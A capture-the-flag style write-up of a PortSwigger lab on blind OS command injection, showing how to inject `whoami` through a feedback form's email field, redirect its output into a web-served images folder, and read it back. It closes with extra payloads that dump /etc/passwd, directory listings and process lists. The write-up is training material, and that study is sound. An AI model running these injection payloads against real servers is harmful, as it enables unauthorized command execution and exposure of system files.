# Blind OS Command Injection with Output Redirection

> This writeup follows the OWASP Web Security Testing Guide (WSTG) methodology.

---

## Goal

Execute the `whoami` command and retrieve its output by redirecting it to a file.

---

## Lab

https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

---

## OWASP Category

A03:2021 – Injection

---

## Core Concept

In the previous lab we could only detect injection using time — we could not read any output. Here we use a smarter technique — **output redirection**.

The idea:
1. Inject a command and redirect its output to a **file on the web server**
2. Then **fetch that file** through the browser to read the output

```bash
# The > operator redirects command output to a file
whoami > /var/www/images/output.txt

# Then fetch it:
https://site.com/image?filename=output.txt
```

This works because:
- The server has a **writable folder** at `/var/www/images/`
- The application **serves images** from that same folder
- So anything we write there becomes accessible via the image URL

### The `>` Redirect Operator

```bash
command > file     # write output to file (overwrite)
command >> file    # append output to file
command 2> file    # write error output to file
command &> file    # write both output and errors to file
```

---

## Steps to Solve

---

**Step 1 — Find the Injection Point**

Navigate to **Submit Feedback**, fill in the form and intercept in ZAP:

```http
POST /feedback/submit HTTP/1.1
Host: lab-id.web-security-academy.net

csrf=token&name=a&email=test@test.com&subject=a&message=a
```

The `email` field is our injection point.

<img width="1330" height="395" alt="image" src="https://github.com/user-attachments/assets/8695bab4-f634-4965-8e73-dfb39d77b0c6" />

---

**Step 2 — Confirm Injection with Time Delay First**

Before redirecting, confirm injection works:

```
email=test@test.com||ping+-c+5+127.0.0.1||
```

If response delays ~5 seconds → injection confirmed 

<img width="1893" height="92" alt="image" src="https://github.com/user-attachments/assets/2ed45170-ae6f-4fd3-86be-d1fafcf4ef7e" />

---

**Step 3 — Redirect whoami Output to File**

Now inject `whoami` with output redirection to the writable images folder:

```
email=test@test.com||whoami>/var/www/images/output.txt||
```

URL encoded:
```
email=test@test.com||whoami+>+/var/www/images/output.txt||
```

Send the request — no visible response change, but the file is now written on the server.

<img width="969" height="378" alt="image" src="https://github.com/user-attachments/assets/7c004754-a975-4524-a544-b523cbb4ef5b" />

---

**Step 4 — Find the Image Fetch URL**

Go to any product page and right-click a product image → **Open in new tab**. The URL looks like:

```
https://lab-id.web-security-academy.net/image?filename=70.jpg
```

This is the URL pattern for fetching files from `/var/www/images/`.

<img width="963" height="486" alt="image" src="https://github.com/user-attachments/assets/62bed137-011f-4f6a-96f3-4b2dd54fd4f7" />

---

**Step 5 — Fetch the Output File**

Replace the image filename with our output file:

```
https://lab-id.web-security-academy.net/image?filename=output.txt
```

The username from `whoami` appears in the browser.

<img width="1210" height="600" alt="image" src="https://github.com/user-attachments/assets/f72836a8-ec00-402c-85c2-79f7b9861ae4" />

---

**Lab Solved**

<img width="1481" height="718" alt="image" src="https://github.com/user-attachments/assets/9e0168c5-36fb-4157-aeab-db6ea1ebf443" />

---

## How This Differs from Previous Labs

| | Simple | Time Delay | Output Redirection |
|--|--|--|--|
| Output visible | Yes — in response | No | Yes — via file fetch |
| Confirm by | Seeing output | Response time | File content |
| Requires writable path | No | No | **Yes** |
| Steps | 1 | 1 | 2 (write then fetch) |

---

## Other Useful Redirection Payloads

```bash
# Read sensitive files and save
cat /etc/passwd > /var/www/images/passwd.txt

# List directory
ls -la / > /var/www/images/ls.txt

# Get network info
ifconfig > /var/www/images/net.txt

# Check running processes
ps -ef > /var/www/images/ps.txt
```

---

*This writeup is intended for educational purposes only. All techniques documented here were performed on PortSwigger's intentionally vulnerable practice platform. The author does not encourage or condone the use of these methods against any system without explicit written permission. Unauthorized use of these techniques may violate applicable laws and regulations.*
